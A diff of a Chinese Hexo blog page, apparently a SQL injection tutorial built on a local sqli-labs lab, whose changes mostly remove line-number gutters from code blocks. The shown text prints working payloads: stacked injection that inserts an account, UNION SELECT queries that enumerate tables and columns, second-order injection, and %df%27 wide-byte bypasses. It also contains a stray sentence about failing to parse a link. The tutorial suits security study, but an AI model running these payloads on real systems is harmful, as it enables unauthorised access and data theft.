 <p>在堆叠注入页面中，程序获取 <code>GET</code> 参数的 <code>id</code>，使用 <code>mysqli</code> 的方式进行数据查询，在执行语句时使用了 <code>mysqli_multi_query</code> 函数处理 SQL 语句，导致存在堆叠注入。</p>
 <p>进入 Docker 容器：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker <span class="built_in">exec</span> -ti sqli /bin/bash</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker <span class="built_in">exec</span> -ti sqli /bin/bash</span><br></pre></td></tr></table></figure>
 
 <h2 id="1-9-5-堆叠注入的利用"><a href="#1-9-5-堆叠注入的利用" class="headerlink" title="1.9.5 堆叠注入的利用"></a>1.9.5 堆叠注入的利用</h2><p>使用以下语句先确定是否存在注入：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND 1=2--+ </span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND 1=2--+ </span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
 <p>接着使用堆叠语法进行检测：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-999</span><span class="string">&#x27; UNION SELECT 1,2,(SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database() LIMIT 1)--+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-999</span><span class="string">&#x27; UNION SELECT 1,2,(SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database() LIMIT 1)--+</span></span><br></pre></td></tr></table></figure>
 
 <p>把库里的所有表获取出来，再获取字段：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-999</span><span class="string">&#x27; UNION SELECT 1,2,(SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME=&#x27;</span>users<span class="string">&#x27; LIMIT 1)--+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-999</span><span class="string">&#x27; UNION SELECT 1,2,(SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME=&#x27;</span>users<span class="string">&#x27; LIMIT 1)--+</span></span><br></pre></td></tr></table></figure>
 
 <p>知道表的列的情况下，使用 <code>INSERT INTO</code> 插入语句进行增加账号。如果是管理表，直接添加管理员账号即可登录后台。</p>
 <p>由于网络原因，我无法成功解析以下链接。如果需要该网页的具体内容，请检查链接的合法性，并适当重试。</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="http://192.168.0.145:7766/Less-38/?id=1%27">http://192.168.0.145:7766/Less-38/?id=1%27</a></li>
 </ul>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-999</span><span class="string">&#x27;; INSERT INTO users(id,username,password) VALUES(1000,&#x27;</span>moonsec<span class="string">&#x27;,&#x27;</span><span class="number">123456</span><span class="string">&#x27;)--+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-999</span><span class="string">&#x27;; INSERT INTO users(id,username,password) VALUES(1000,&#x27;</span>moonsec<span class="string">&#x27;,&#x27;</span><span class="number">123456</span><span class="string">&#x27;)--+</span></span><br></pre></td></tr></table></figure>
 
 <p>访问 <code>1000</code> 即可访问到刚刚添加的账号。</p>
 <h1 id="1-10-二次注入"><a href="#1-10-二次注入" class="headerlink" title="1.10 二次注入"></a>1.10 二次注入</h1><h2 id="二次注入攻击"><a href="#二次注入攻击" class="headerlink" title="二次注入攻击"></a>二次注入攻击</h2><p>二次注入漏洞是一种在 Web 应用程序中广泛存在的安全漏洞形式。相对于一次注入漏洞而言，二次注入漏洞更难以被发现，但它却具有与一次注入攻击漏洞相同的攻击威力。</p>
@@ -1155,7 +1155,7 @@ sleep(10)--+ 函数 sleep() 在 mysql 是延时返回的意思 以秒为单位 s
 <p><code>mysql_escape_string</code> 函数会将特殊字符进行过滤，例如 <code>&#39;</code> 经过转义就成了 <code>\&#39;</code>，然后用 <code>INSERT INTO</code> 存入数据库中。</p>
 <p>在 <code>login.php</code> 中查看源码，登录时获取用户名和密码，使用 <code>mysql_escape_string</code> 对输入的参数进行转义。转义之后在数据库中查找指定的账号和密码，再传入到 <code>session</code> 中。</p>
 <p>在 <code>pass_change.php</code> 中查看源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] 复制给 <span class="variable">$username</span> 无任何过滤再带入 UPDATE 语句中造成注入。</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] 复制给 <span class="variable">$username</span> 无任何过滤再带入 UPDATE 语句中造成注入。</span><br></pre></td></tr></table></figure>
 
 <p>整个流程就是：注册用户 → 更改密码时触发注入。可以看到二次注入较为隐蔽，通常发生在需要二次带入数据提交的功能里，例如用户注册 → 修改密码，邮箱注册 → 修改密码，文章添加 → 文章编辑等。</p>
 <h2 id="1-19-8-黑盒环境下进行二次注入测试"><a href="#1-19-8-黑盒环境下进行二次注入测试" class="headerlink" title="1.19.8 黑盒环境下进行二次注入测试"></a>1.19.8 黑盒环境下进行二次注入测试</h2><p>先确定测试的网站是否进行过滤，一般情况下网站都会对输入的参数进行过滤，然后寻找可能会带入恶意数据二次使用的地方。例如：</p>
@@ -1172,14 +1172,14 @@ sleep(10)--+ 函数 sleep() 在 mysql 是延时返回的意思 以秒为单位 s
 <h1 id="1-11-宽字节注入"><a href="#1-11-宽字节注入" class="headerlink" title="1.11 宽字节注入"></a>1.11 宽字节注入</h1><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>宽字节注入，在 SQL 进行防注入的时候，一般会开启 <code>GPC</code>，过滤特殊字符。一般情况下开启 <code>GPC</code> 是可以防御很多字符串型的注入，但是如果数据库编码不对，也可以导致 SQL 防注入绕过，达到注入的目的。如果数据库设置宽字节字符集 <code>GBK</code> 会导致宽字节注入，从而逃逸 <code>GPC</code>。</p>
 <h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><p>简单理解：数据库编码与 PHP 编码设置为不同的两个编码那么就有可能产生宽字节注入。</p>
 <p>深入讲解：要有宽字节注入漏洞，首先要满足数据库后端使用双&#x2F;多字节解析 SQL 语句，其次还要保证在这种字符集范围中包含低字节位是 <code>0x5C (01011100)</code> 的字符。初步的测试结果 <code>Big5</code> 和 <code>GBK</code> 字符集都是有的，<code>UTF-8</code> 和 <code>GB2312</code> 没有这种字符（也就不存在宽字节注入）。</p>
-<h2 id="GPC-绕过过程"><a href="#GPC-绕过过程" class="headerlink" title="GPC 绕过过程"></a>GPC 绕过过程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df%27 ===(addslashes)===&gt; %df%5c%27 ===(数据库 GBK)===&gt; 運&#x27;</span><br></pre></td></tr></table></figure>
+<h2 id="GPC-绕过过程"><a href="#GPC-绕过过程" class="headerlink" title="GPC 绕过过程"></a>GPC 绕过过程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df%27 ===(addslashes)===&gt; %df%5c%27 ===(数据库 GBK)===&gt; 運&#x27;</span><br></pre></td></tr></table></figure>
 
 <h2 id="1-11-1-宽字节注入代码分析"><a href="#1-11-1-宽字节注入代码分析" class="headerlink" title="1.11.1 宽字节注入代码分析"></a>1.11.1 宽字节注入代码分析</h2><p>从源代码分析，存在漏洞的代码首先 <code>check_addslashes</code> 是将特殊字符进行过滤，将 <code>&#39;</code> 变成 <code>\&#39;</code>。<code>mysql_query</code> 设置数据库的编码为 <code>GBK</code>，将 <code>id</code> 参数传入到 SQL 中带入查询。传入 <code>%df%27</code> 即可逃逸 <code>GPC</code>，故存在宽字节注入。</p>
 <h2 id="1-11-2-黑盒环境下的宽字节攻击"><a href="#1-11-2-黑盒环境下的宽字节攻击" class="headerlink" title="1.11.2 黑盒环境下的宽字节攻击"></a>1.11.2 黑盒环境下的宽字节攻击</h2><p>宽字节检测较为简单，输入 <code>%df%27</code> 检测即可，或者使用配合 <code>and 1=1</code> 检测即可。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1%df%27%20and%201=1--+ 页面是否存在乱码</span><br><span class="line">-1%df%27%20or%20sleep(10)--+ 页面是否存在延时</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1%df%27%20and%201=1--+ 页面是否存在乱码</span><br><span class="line">-1%df%27%20or%20sleep(10)--+ 页面是否存在延时</span><br></pre></td></tr></table></figure>
 
 <p>均可以测试存在宽字节注入。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1%df%27%20union%20select%201,version(),database()--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1%df%27%20union%20select%201,version(),database()--+</span><br></pre></td></tr></table></figure>
 
 
 
@@ -1671,16 +1671,16 @@ sleep(10)--+ 函数 sleep() 在 mysql 是延时返回的意思 以秒为单位 s
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2019-2025</span>
+                <span id="year">2025</span>
             
-            <span id="year">2019</span>
+            <span id="year">2025</span>
             <a href="/about" target="_blank">Apzx7</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">33.3k</span>&nbsp;字
+                class="white-color">33.2k</span>&nbsp;字
             
             
             
